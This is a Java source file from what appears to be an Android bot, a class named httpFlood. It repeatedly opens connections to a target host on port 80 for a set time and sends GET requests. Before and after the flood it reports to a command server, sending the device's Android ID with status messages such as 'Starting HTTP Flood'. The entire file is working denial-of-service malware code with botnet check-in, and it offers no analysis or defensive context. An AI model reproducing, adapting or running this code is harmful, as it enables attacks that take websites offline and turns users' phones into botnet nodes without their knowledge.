package u.can.i.up.expert.utils;

import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.concurrent.TimeUnit;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class httpFlood extends AsyncTask<String, Void, String> {
    String i = "";
    String j = "";
    public httpFlood(String i, String j) {
        this.i = i;
        this.j = j;
    }
    @Override
    protected String doInBackground(String... params) {
        for (long stop=System.nanoTime()+ TimeUnit.MILLISECONDS.toNanos(Integer.parseInt(j));stop>System.nanoTime();) {
            try {
                String target = i;
                Socket net = new Socket(target, 80);
                Factory.sendRawLine("GET / HTTP/1.1", net);
                Factory.sendRawLine("Host: " + target, net);
                Factory.sendRawLine("Connection: close", net);
            }
            catch(UnknownHostException e)
            {}
            catch(IOException e)
            {}
        }
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {try {
        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Let The Flood Begin!");
    } catch (UnsupportedEncodingException e) {

        e.printStackTrace();
    }}
    @Override
    protected void onPreExecute() {try {
        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Starting HTTP Flood");
    } catch (UnsupportedEncodingException e) {

        e.printStackTrace();
    }}
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}

